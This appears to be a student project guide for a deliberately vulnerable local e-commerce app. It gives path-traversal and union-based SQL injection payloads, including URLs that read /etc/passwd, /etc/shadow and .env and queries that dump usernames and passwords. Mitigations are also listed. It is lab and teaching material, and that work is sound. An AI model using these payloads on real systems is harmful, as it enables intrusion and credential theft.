# LFI and Union-Based SQL Injection Guide

## 🎯 Overview

Two new vulnerable API endpoints have been created for demonstrating:

1. **Local File Inclusion (LFI)** - `/api/view-file`
2. **Union-Based SQL Injection** - `/api/products-search`

Both endpoints are **intentionally vulnerable** for educational purposes.

---

## 📁 Files Created

1. **`pages/api/view-file.js`** - Vulnerable LFI endpoint
2. **`pages/api/products-search.js`** - Vulnerable SQL injection endpoint

---

## 🧪 Testing Local File Inclusion (LFI)

### Endpoint: `GET /api/view-file?file=<path>`

### Test 1: Read Normal Files

**Windows:**
```
http://localhost:3000/api/view-file?file=package.json
http://localhost:3000/api/view-file?file=README.md
```

**Linux/Mac:**
```
http://localhost:3000/api/view-file?file=package.json
http://localhost:3000/api/view-file?file=README.md
```

### Test 2: Directory Traversal (Path Traversal)

**Windows:**
```
http://localhost:3000/api/view-file?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
http://localhost:3000/api/view-file?file=..\\..\\..\\..\\..\\Windows\\win.ini
```

**Linux/Mac:**
```
http://localhost:3000/api/view-file?file=../../etc/passwd
http://localhost:3000/api/view-file?file=../../../etc/passwd
http://localhost:3000/api/view-file?file=../../../../etc/shadow
http://localhost:3000/api/view-file?file=../../proc/version
http://localhost:3000/api/view-file?file=../../etc/hosts
```

### Test 3: Application Files

```
http://localhost:3000/api/view-file?file=../lib/db.js
http://localhost:3000/api/view-file?file=../.env
http://localhost:3000/api/view-file?file=../package.json
```

### URL Encoding (if needed):

```
# Linux /etc/passwd
http://localhost:3000/api/view-file?file=..%2F..%2Fetc%2Fpasswd

# Windows hosts file
http://localhost:3000/api/view-file?file=..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
```

---

## 🧪 Testing Union-Based SQL Injection

### Endpoint: `GET /api/products-search?category=<payload>`

### Test 1: Basic SQL Injection

**Break out of the query:**
```
http://localhost:3000/api/products-search?category=' OR '1'='1
```

**Expected:** Returns all products

### Test 2: Union-Based Injection - Find Column Count

**Test with different column counts:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3--
http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3,4--
http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3,4,5--
```

**Find the correct number** (should match: id, name, price = 3 columns)

### Test 3: Extract Database Information

**Database Version:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@version,3--
```

**Or for MySQL:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,VERSION(),3--
```

**Current Database User:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,USER(),3--
```

**Or:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,CURRENT_USER(),3--
```

**Current Database Name:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,DATABASE(),3--
```

### Test 4: Extract Table Names

**List all tables:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE()--
```

**Or get specific table:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='fyp_ecommerce'--
```

### Test 5: Extract Column Names

**List columns from users table:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

### Test 6: Extract Data from Other Tables

**Get users:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT id,username,password FROM users--
```

**Get all data:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT id,username,email FROM users--
```

### Test 7: Find Configuration Files Path

**MySQL Configuration:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@datadir,3--
```

**Or:**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@basedir,3--
```

**SQLite (if using SQLite):**
```
http://localhost:3000/api/products-search?category=' UNION SELECT 1,sqlite_version(),3--
```

---

## 📝 Complete Attack Chain Examples

### LFI Attack Chain:

1. **Read application config:**
   ```
   /api/view-file?file=../.env
   ```

2. **Read system files:**
   ```
   /api/view-file?file=../../etc/passwd
   ```

3. **Read source code:**
   ```
   /api/view-file?file=../lib/db.js
   ```

### SQL Injection Attack Chain:

1. **Test injection:**
   ```
   /api/products-search?category=' OR '1'='1--
   ```

2. **Find column count:**
   ```
   /api/products-search?category=' UNION SELECT 1,2,3--
   ```

3. **Extract database info:**
   ```
   /api/products-search?category=' UNION SELECT 1,VERSION(),3--
   /api/products-search?category=' UNION SELECT 1,USER(),3--
   /api/products-search?category=' UNION SELECT 1,DATABASE(),3--
   ```

4. **Extract table names:**
   ```
   /api/products-search?category=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE()--
   ```

5. **Extract sensitive data:**
   ```
   /api/products-search?category=' UNION SELECT id,username,password FROM users--
   ```

---

## ⚠️ Security Issues Demonstrated

### Local File Inclusion (LFI):

1. **No Path Sanitization**
   - Problem: User input directly used in file path
   - Impact: Can read any file on the system
   - Fix: Validate paths, use whitelist, prevent directory traversal

2. **Directory Traversal**
   - Problem: `../` sequences not blocked
   - Impact: Access files outside intended directory
   - Fix: Normalize paths, check for `../`, use absolute paths

3. **No Access Control**
   - Problem: Any file can be read
   - Impact: Sensitive data exposure
   - Fix: Implement file access restrictions

### Union-Based SQL Injection:

1. **String Concatenation**
   - Problem: User input directly in SQL string
   - Impact: Arbitrary SQL execution
   - Fix: Use parameterized queries

2. **No Input Validation**
   - Problem: Special characters not escaped
   - Impact: SQL injection attacks
   - Fix: Validate and sanitize input

3. **Information Disclosure**
   - Problem: SQL errors and structure exposed
   - Impact: Database enumeration
   - Fix: Generic error messages, proper logging

---

## 🔧 For Your FYP Report

### LFI Attack Chain:
```
1. Attacker sends malicious file path
2. No path sanitization applied
3. Directory traversal (../../) works
4. Sensitive files read
5. System compromised
```

### SQL Injection Attack Chain:
```
1. Attacker sends malicious SQL payload
2. Input directly concatenated into SQL
3. UNION SELECT extracts data
4. Database structure revealed
5. Sensitive data exfiltrated
```

### Vulnerabilities:
1. ✅ LFI (Local File Inclusion)
2. ✅ SQL Injection (Union-Based)
3. ✅ No input validation
4. ✅ No path sanitization
5. ✅ Information disclosure

### Impact:
- **LFI**: Read sensitive files, configuration, source code
- **SQL Injection**: Extract database data, enumerate structure, access other tables

### Mitigation:
1. **LFI**:
   - Validate file paths
   - Use whitelist of allowed files
   - Prevent directory traversal
   - Use absolute paths with validation

2. **SQL Injection**:
   - Use parameterized queries
   - Validate and sanitize input
   - Use prepared statements
   - Implement least privilege

---

## ✅ Quick Test Commands

### LFI:
```bash
# Linux
curl "http://localhost:3000/api/view-file?file=../../etc/passwd"

# Windows
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
```

### SQL Injection:
```bash
# Basic injection
curl "http://localhost:3000/api/products-search?category=' OR '1'='1"

# Union injection
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,VERSION(),3--"
```

---

## 📸 For Demo Video

### LFI Demo:
1. Show normal file read: `package.json`
2. Show directory traversal: `../../etc/passwd`
3. Show sensitive file read: `.env` or `db.js`
4. Explain the vulnerability

### SQL Injection Demo:
1. Show normal search: `category=sports`
2. Show basic injection: `category=' OR '1'='1`
3. Show UNION injection: Extract database version
4. Show data extraction: Get users table
5. Explain the vulnerability

Both vulnerabilities are now ready for your FYP demo! 🎉
